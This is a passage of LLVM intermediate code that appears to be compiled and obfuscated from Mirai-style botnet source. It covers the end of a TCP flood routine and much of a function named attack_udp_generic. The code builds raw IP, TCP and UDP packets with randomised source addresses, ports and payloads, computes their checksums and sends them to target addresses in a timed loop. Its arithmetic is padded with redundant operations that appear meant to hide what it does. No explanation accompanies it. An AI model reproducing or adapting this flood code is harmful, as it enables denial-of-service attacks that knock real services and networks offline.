  store i8* %450, i8** %32, align 8
  %451 = load i8*, i8** %32, align 8
  %452 = getelementptr inbounds i8, i8* %451, i32 1
  store i8* %452, i8** %32, align 8
  store i8 1, i8* %451, align 1
  %453 = load i8*, i8** %32, align 8
  %454 = getelementptr inbounds i8, i8* %453, i32 1
  store i8* %454, i8** %32, align 8
  store i8 3, i8* %453, align 1
  %455 = load i8*, i8** %32, align 8
  %456 = getelementptr inbounds i8, i8* %455, i32 1
  store i8* %456, i8** %32, align 8
  store i8 3, i8* %455, align 1
  %457 = load i8*, i8** %32, align 8
  %458 = getelementptr inbounds i8, i8* %457, i32 1
  store i8* %458, i8** %32, align 8
  store i8 6, i8* %457, align 1
  br label %459

; <label>:459:                                    ; preds = %212
  %460 = load i32, i32* %11, align 4
  %461 = sub i32 0, %460
  %462 = sub i32 0, 1
  %463 = add i32 %461, %462
  %464 = sub i32 0, %463
  %465 = add nsw i32 %460, 1
  store i32 %464, i32* %11, align 4
  br label %120

; <label>:466:                                    ; preds = %120
  br label %467

; <label>:467:                                    ; preds = %650, %466
  store i32 0, i32* %11, align 4
  br label %468

; <label>:468:                                    ; preds = %637, %467
  %469 = load i32, i32* %11, align 4
  %470 = load i8, i8* %7, align 1
  %471 = zext i8 %470 to i32
  %472 = icmp slt i32 %469, %471
  br i1 %472, label %473, label %644

; <label>:473:                                    ; preds = %468
  %474 = load i8**, i8*** %13, align 8
  %475 = load i32, i32* %11, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds i8*, i8** %474, i64 %476
  %478 = load i8*, i8** %477, align 8
  store i8* %478, i8** %33, align 8
  %479 = load i8*, i8** %33, align 8
  %480 = bitcast i8* %479 to %struct.iphdr*
  store %struct.iphdr* %480, %struct.iphdr** %34, align 8
  %481 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i64 1
  %483 = bitcast %struct.iphdr* %482 to %struct.tcphdr*
  store %struct.tcphdr* %483, %struct.tcphdr** %35, align 8
  %484 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %485 = load i32, i32* %11, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 2
  %489 = load i8, i8* %488, align 4
  %490 = zext i8 %489 to i32
  %491 = icmp slt i32 %490, 32
  br i1 %491, label %492, label %515

; <label>:492:                                    ; preds = %473
  %493 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %494 = load i32, i32* %11, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i64 %495
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i32 0, i32 1
  %498 = load i32, i32* %497, align 4
  %499 = call i32 @ntohl(i32 %498) #7
  %500 = call i32 @rand_next()
  %501 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %502 = load i32, i32* %11, align 4
  %503 = sext i32 %502 to i64
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %501, i64 %503
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %504, i32 0, i32 2
  %506 = load i8, i8* %505, align 4
  %507 = zext i8 %506 to i32
  %508 = lshr i32 %500, %507
  %509 = sub i32 0, %508
  %510 = sub i32 %499, %509
  %511 = add i32 %499, %508
  %512 = call i32 @htonl(i32 %510) #7
  %513 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 9
  store i32 %512, i32* %514, align 4
  br label %515

; <label>:515:                                    ; preds = %492, %473
  %516 = load i32, i32* %28, align 4
  %517 = icmp eq i32 %516, -1
  br i1 %517, label %518, label %522

; <label>:518:                                    ; preds = %515
  %519 = call i32 @rand_next()
  %520 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %521 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %520, i32 0, i32 8
  store i32 %519, i32* %521, align 4
  br label %522

; <label>:522:                                    ; preds = %518, %515
  %523 = load i16, i16* %15, align 2
  %524 = zext i16 %523 to i32
  %525 = icmp eq i32 %524, 65535
  br i1 %525, label %526, label %539

; <label>:526:                                    ; preds = %522
  %527 = call i32 @rand_next()
  %528 = xor i32 %527, -1
  %529 = xor i32 65535, -1
  %530 = xor i32 -946095151, -1
  %531 = or i32 %528, %529
  %532 = or i32 -946095151, %530
  %533 = xor i32 %531, -1
  %534 = and i32 %533, %532
  %535 = and i32 %527, 65535
  %536 = trunc i32 %534 to i16
  %537 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 3
  store i16 %536, i16* %538, align 4
  br label %539

; <label>:539:                                    ; preds = %526, %522
  %540 = load i16, i16* %18, align 2
  %541 = zext i16 %540 to i32
  %542 = icmp eq i32 %541, 65535
  br i1 %542, label %543, label %556

; <label>:543:                                    ; preds = %539
  %544 = call i32 @rand_next()
  %545 = xor i32 %544, -1
  %546 = xor i32 65535, -1
  %547 = xor i32 -352058523, -1
  %548 = or i32 %545, %546
  %549 = or i32 -352058523, %547
  %550 = xor i32 %548, -1
  %551 = and i32 %550, %549
  %552 = and i32 %544, 65535
  %553 = trunc i32 %551 to i16
  %554 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %555 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %554, i32 0, i32 0
  store i16 %553, i16* %555, align 4
  br label %556

; <label>:556:                                    ; preds = %543, %539
  %557 = load i16, i16* %19, align 2
  %558 = zext i16 %557 to i32
  %559 = icmp eq i32 %558, 65535
  br i1 %559, label %560, label %573

; <label>:560:                                    ; preds = %556
  %561 = call i32 @rand_next()
  %562 = xor i32 %561, -1
  %563 = xor i32 65535, -1
  %564 = xor i32 1199968749, -1
  %565 = or i32 %562, %563
  %566 = or i32 1199968749, %564
  %567 = xor i32 %565, -1
  %568 = and i32 %567, %566
  %569 = and i32 %561, 65535
  %570 = trunc i32 %568 to i16
  %571 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 1
  store i16 %570, i16* %572, align 2
  br label %573

; <label>:573:                                    ; preds = %560, %556
  %574 = load i32, i32* %20, align 4
  %575 = icmp eq i32 %574, 65535
  br i1 %575, label %576, label %580

; <label>:576:                                    ; preds = %573
  %577 = call i32 @rand_next()
  %578 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %579 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %578, i32 0, i32 2
  store i32 %577, i32* %579, align 4
  br label %580

; <label>:580:                                    ; preds = %576, %573
  %581 = load i32, i32* %21, align 4
  %582 = icmp eq i32 %581, 65535
  br i1 %582, label %583, label %587

; <label>:583:                                    ; preds = %580
  %584 = call i32 @rand_next()
  %585 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %586 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %585, i32 0, i32 3
  store i32 %584, i32* %586, align 4
  br label %587

; <label>:587:                                    ; preds = %583, %580
  %588 = load i8, i8* %22, align 1
  %589 = icmp ne i8 %588, 0
  br i1 %589, label %590, label %599

; <label>:590:                                    ; preds = %587
  %591 = call i32 @rand_next()
  %592 = xor i32 65535, -1
  %593 = xor i32 %591, %592
  %594 = and i32 %593, %591
  %595 = and i32 %591, 65535
  %596 = trunc i32 %594 to i16
  %597 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 7
  store i16 %596, i16* %598, align 2
  br label %599

; <label>:599:                                    ; preds = %590, %587
  %600 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %601 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %600, i32 0, i32 7
  store i16 0, i16* %601, align 2
  %602 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %603 = bitcast %struct.iphdr* %602 to i16*
  %604 = call zeroext i16 @checksum_generic(i16* %603, i32 20)
  %605 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %606 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %605, i32 0, i32 7
  store i16 %604, i16* %606, align 2
  %607 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %608 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %607, i32 0, i32 6
  store i16 0, i16* %608, align 4
  %609 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %610 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %611 = bitcast %struct.tcphdr* %610 to i8*
  %612 = call zeroext i16 @htons(i16 zeroext 40) #7
  %613 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %609, i8* %611, i16 zeroext %612, i32 40)
  %614 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %615 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %614, i32 0, i32 6
  store i16 %613, i16* %615, align 4
  %616 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %617 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %616, i32 0, i32 1
  %618 = load i16, i16* %617, align 2
  %619 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %620 = load i32, i32* %11, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 0
  %624 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %623, i32 0, i32 1
  store i16 %618, i16* %624, align 2
  %625 = load i32, i32* %12, align 4
  %626 = load i8*, i8** %33, align 8
  %627 = bitcast %union.__CONST_SOCKADDR_ARG* %36 to %struct.sockaddr**
  %628 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %629 = load i32, i32* %11, align 4
  %630 = sext i32 %629 to i64
  %631 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %628, i64 %630
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i32 0, i32 0
  %633 = bitcast %struct.sockaddr_in* %632 to %struct.sockaddr*
  store %struct.sockaddr* %633, %struct.sockaddr** %627, align 8
  %634 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %36, i32 0, i32 0
  %635 = load %struct.sockaddr*, %struct.sockaddr** %634, align 8
  %636 = call i64 @sendto(i32 %625, i8* %626, i64 60, i32 16384, %struct.sockaddr* %635, i32 16)
  br label %637

; <label>:637:                                    ; preds = %599
  %638 = load i32, i32* %11, align 4
  %639 = sub i32 0, %638
  %640 = sub i32 0, 1
  %641 = add i32 %639, %640
  %642 = sub i32 0, %641
  %643 = add nsw i32 %638, 1
  store i32 %642, i32* %11, align 4
  br label %468

; <label>:644:                                    ; preds = %468
  %645 = call i64 @time(i64* null) #6
  %646 = load i32, i32* %29, align 4
  %647 = sext i32 %646 to i64
  %648 = icmp sgt i64 %645, %647
  br i1 %648, label %649, label %650

; <label>:649:                                    ; preds = %644
  br label %651

; <label>:650:                                    ; preds = %644
  br label %467

; <label>:651:                                    ; preds = %649, %116, %110
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 %71, 7123369448377383512
  %75 = add i64 %74, %73
  %76 = sub i64 %75, 7123369448377383512
  %77 = add nsw i64 %71, %73
  %78 = trunc i64 %76 to i32
  store i32 %78, i32* %23, align 4
  %79 = load i16, i16* %20, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp sgt i32 %80, 1460
  br i1 %81, label %82, label %83

; <label>:82:                                     ; preds = %5
  store i16 1460, i16* %20, align 2
  br label %83

; <label>:83:                                     ; preds = %82, %5
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %12, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %83
  br label %383

; <label>:87:                                     ; preds = %83
  store i32 1, i32* %11, align 4
  %88 = load i32, i32* %12, align 4
  %89 = bitcast i32* %11 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  br label %383

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %11, align 4
  br label %96

; <label>:96:                                     ; preds = %214, %95
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %221

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %103 = load i8**, i8*** %13, align 8
  %104 = load i32, i32* %11, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %13, align 8
  %108 = load i32, i32* %11, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %24, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %25, align 8
  %116 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %117 = bitcast %struct.iphdr* %116 to i8*
  %118 = load i8, i8* %117, align 4
  %119 = xor i8 %118, -1
  %120 = xor i8 15, -1
  %121 = xor i8 37, -1
  %122 = or i8 %119, %120
  %123 = or i8 37, %121
  %124 = xor i8 %122, -1
  %125 = and i8 %124, %123
  %126 = and i8 %118, 15
  %127 = xor i8 %125, -1
  %128 = xor i8 64, -1
  %129 = xor i8 28, -1
  %130 = and i8 %127, 28
  %131 = and i8 %125, %129
  %132 = and i8 %128, 28
  %133 = and i8 64, %129
  %134 = or i8 %130, %131
  %135 = or i8 %132, %133
  %136 = xor i8 %134, %135
  %137 = or i8 %127, %128
  %138 = xor i8 %137, -1
  %139 = or i8 28, %129
  %140 = and i8 %138, %139
  %141 = or i8 %136, %140
  %142 = or i8 %125, 64
  store i8 %141, i8* %117, align 4
  %143 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %144 = bitcast %struct.iphdr* %143 to i8*
  %145 = load i8, i8* %144, align 4
  %146 = xor i8 %145, -1
  %147 = xor i8 -16, -1
  %148 = xor i8 -124, -1
  %149 = or i8 %146, %147
  %150 = or i8 -124, %148
  %151 = xor i8 %149, -1
  %152 = and i8 %151, %150
  %153 = and i8 %145, -16
  %154 = and i8 %152, 5
  %155 = xor i8 %152, 5
  %156 = or i8 %154, %155
  %157 = or i8 %152, 5
  store i8 %156, i8* %144, align 4
  %158 = load i8, i8* %14, align 1
  %159 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 1
  store i8 %158, i8* %160, align 1
  %161 = load i16, i16* %20, align 2
  %162 = zext i16 %161 to i64
  %163 = sub i64 0, %162
  %164 = sub i64 28, %163
  %165 = add i64 28, %162
  %166 = trunc i64 %164 to i16
  %167 = call zeroext i16 @htons(i16 zeroext %166) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 2
  store i16 %167, i16* %169, align 2
  %170 = load i16, i16* %15, align 2
  %171 = call zeroext i16 @htons(i16 zeroext %170) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 3
  store i16 %171, i16* %173, align 4
  %174 = load i8, i8* %16, align 1
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 5
  store i8 %174, i8* %176, align 4
  %177 = load i8, i8* %17, align 1
  %178 = icmp ne i8 %177, 0
  br i1 %178, label %179, label %183

; <label>:179:                                    ; preds = %101
  %180 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %181 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 4
  store i16 %180, i16* %182, align 2
  br label %183

; <label>:183:                                    ; preds = %179, %101
  %184 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 6
  store i8 17, i8* %185, align 1
  %186 = load i32, i32* %22, align 4
  %187 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 8
  store i32 %186, i32* %188, align 4
  %189 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %190 = load i32, i32* %11, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 9
  store i32 %194, i32* %196, align 4
  %197 = load i16, i16* %18, align 2
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %200 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %199, i32 0, i32 0
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %19, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 1
  store i16 %202, i16* %204, align 2
  %205 = load i16, i16* %20, align 2
  %206 = zext i16 %205 to i64
  %207 = sub i64 0, %206
  %208 = sub i64 8, %207
  %209 = add i64 8, %206
  %210 = trunc i64 %208 to i16
  %211 = call zeroext i16 @htons(i16 zeroext %210) #7
  %212 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %213 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %212, i32 0, i32 2
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %183
  %215 = load i32, i32* %11, align 4
  %216 = sub i32 0, %215
  %217 = sub i32 0, 1
  %218 = add i32 %216, %217
  %219 = sub i32 0, %218
  %220 = add nsw i32 %215, 1
  store i32 %219, i32* %11, align 4
  br label %96

; <label>:221:                                    ; preds = %96
  br label %222

; <label>:222:                                    ; preds = %382, %221
  store i32 0, i32* %11, align 4
  br label %223

; <label>:223:                                    ; preds = %371, %222
  %224 = load i32, i32* %11, align 4
  %225 = load i8, i8* %7, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp slt i32 %224, %226
  br i1 %227, label %228, label %376

; <label>:228:                                    ; preds = %223
  %229 = load i8**, i8*** %13, align 8
  %230 = load i32, i32* %11, align 4
  %231 = sext i32 %230 to i64
  %232 = getelementptr inbounds i8*, i8** %229, i64 %231
  %233 = load i8*, i8** %232, align 8
  store i8* %233, i8** %26, align 8
  %234 = load i8*, i8** %26, align 8
  %235 = bitcast i8* %234 to %struct.iphdr*
  store %struct.iphdr* %235, %struct.iphdr** %27, align 8
  %236 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i64 1
  %238 = bitcast %struct.iphdr* %237 to %struct.udphdr*
  store %struct.udphdr* %238, %struct.udphdr** %28, align 8
  %239 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %240 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %239, i64 1
  %241 = bitcast %struct.udphdr* %240 to i8*
  store i8* %241, i8** %29, align 8
  %242 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %243 = load i32, i32* %11, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %242, i64 %244
  %246 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %245, i32 0, i32 2
  %247 = load i8, i8* %246, align 4
  %248 = zext i8 %247 to i32
  %249 = icmp slt i32 %248, 32
  br i1 %249, label %250, label %274

; <label>:250:                                    ; preds = %228
  %251 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %252 = load i32, i32* %11, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 1
  %256 = load i32, i32* %255, align 4
  %257 = call i32 @ntohl(i32 %256) #7
  %258 = call i32 @rand_next()
  %259 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %260 = load i32, i32* %11, align 4
  %261 = sext i32 %260 to i64
  %262 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %259, i64 %261
  %263 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %262, i32 0, i32 2
  %264 = load i8, i8* %263, align 4
  %265 = zext i8 %264 to i32
  %266 = lshr i32 %258, %265
  %267 = add i32 %257, -1935504819
  %268 = add i32 %267, %266
  %269 = sub i32 %268, -1935504819
  %270 = add i32 %257, %266
  %271 = call i32 @htonl(i32 %269) #7
  %272 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 9
  store i32 %271, i32* %273, align 4
  br label %274

; <label>:274:                                    ; preds = %250, %228
  %275 = load i32, i32* %22, align 4
  %276 = icmp eq i32 %275, -1
  br i1 %276, label %277, label %281

; <label>:277:                                    ; preds = %274
  %278 = call i32 @rand_next()
  %279 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  br label %281

; <label>:281:                                    ; preds = %277, %274
  %282 = load i16, i16* %15, align 2
  %283 = zext i16 %282 to i32
  %284 = icmp eq i32 %283, 65535
  br i1 %284, label %285, label %290

; <label>:285:                                    ; preds = %281
  %286 = call i32 @rand_next()
  %287 = trunc i32 %286 to i16
  %288 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 3
  store i16 %287, i16* %289, align 4
  br label %290

; <label>:290:                                    ; preds = %285, %281
  %291 = load i16, i16* %18, align 2
  %292 = zext i16 %291 to i32
  %293 = icmp eq i32 %292, 65535
  br i1 %293, label %294, label %299

; <label>:294:                                    ; preds = %290
  %295 = call i32 @rand_next()
  %296 = trunc i32 %295 to i16
  %297 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i32 0, i32 0
  store i16 %296, i16* %298, align 2
  br label %299

; <label>:299:                                    ; preds = %294, %290
  %300 = load i16, i16* %19, align 2
  %301 = zext i16 %300 to i32
  %302 = icmp eq i32 %301, 65535
  br i1 %302, label %303, label %308

; <label>:303:                                    ; preds = %299
  %304 = call i32 @rand_next()
  %305 = trunc i32 %304 to i16
  %306 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 1
  store i16 %305, i16* %307, align 2
  br label %308

; <label>:308:                                    ; preds = %303, %299
  %309 = load i8, i8* %21, align 1
  %310 = icmp ne i8 %309, 0
  br i1 %310, label %311, label %319

; <label>:311:                                    ; preds = %308
  %312 = load i8*, i8** %29, align 8
  %313 = load i16, i16* %20, align 2
  %314 = zext i16 %313 to i32
  call void @rand_alpha_str(i8* %312, i32 %314)
  %315 = load i8*, i8** %29, align 8
  %316 = load i16, i16* %20, align 2
  %317 = zext i16 %316 to i64
  %318 = getelementptr inbounds i8, i8* %315, i64 %317
  store i8 0, i8* %318, align 1
  br label %319

; <label>:319:                                    ; preds = %311, %308
  %320 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 7
  store i16 0, i16* %321, align 2
  %322 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %323 = bitcast %struct.iphdr* %322 to i16*
  %324 = call zeroext i16 @checksum_generic(i16* %323, i32 20)
  %325 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %326 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %325, i32 0, i32 7
  store i16 %324, i16* %326, align 2
  %327 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %328 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %327, i32 0, i32 3
  store i16 0, i16* %328, align 2
  %329 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %330 = load %struct.udphdr*, %struct.udphdr** %28, align 8
  %331 = bitcast %struct.udphdr* %330 to i8*
  %332 = load %struct.udphdr*, %struct.udphdr** %28, align 8
